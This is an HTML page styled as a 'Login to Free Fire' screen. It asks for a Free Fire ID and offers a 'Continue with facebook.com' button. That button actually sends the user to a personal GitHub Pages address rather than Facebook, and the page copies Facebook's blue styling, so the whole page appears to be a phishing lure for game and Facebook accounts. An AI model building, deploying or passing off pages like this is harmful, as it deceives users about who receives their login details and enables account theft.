<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Futuristic Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #1a1a1a;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            max-width: 400px;
            text-align: center;
            padding: 20px;
            background-color: #262626;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
        }
        .login-container h2 {
            margin-top: 0;
        }
        .login-container input[type="text"] {
            width: 100%;
            padding: 10px;
            margin-top: 10px;
            font-size: 16px;
            border: none;
            background-color: #333;
            color: #ffffff;
            border-radius: 5px;
            box-sizing: border-box;
            outline: none;
        }
        .login-container input[type="text"]::placeholder {
            color: #999;
        }
        .login-container button {
            width: 100%;
            padding: 12px;
            margin-top: 20px;
            font-size: 16px;
            border: none;
            background-color: #1877f2;
            color: #ffffff;
            border-radius: 5px;
            cursor: pointer;
            outline: none;
            transition: background-color 0.3s ease;
        }
        .login-container button:hover {
            background-color: #0d5cb6;
        }
        .login-container .alternative-login {
            margin-top: 20px;
        }
        .login-container .alternative-login a {
            color: #1877f2;
            text-decoration: none;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Login to Free Fire</h2>
        <input type="text" placeholder="Enter Free Fire ID">
        <button onclick="location.href='https://sharmapushkar-coder.github.io/Freefire/facebook'">Continue with facebook.com</button>
    </div>
</body>
</html>
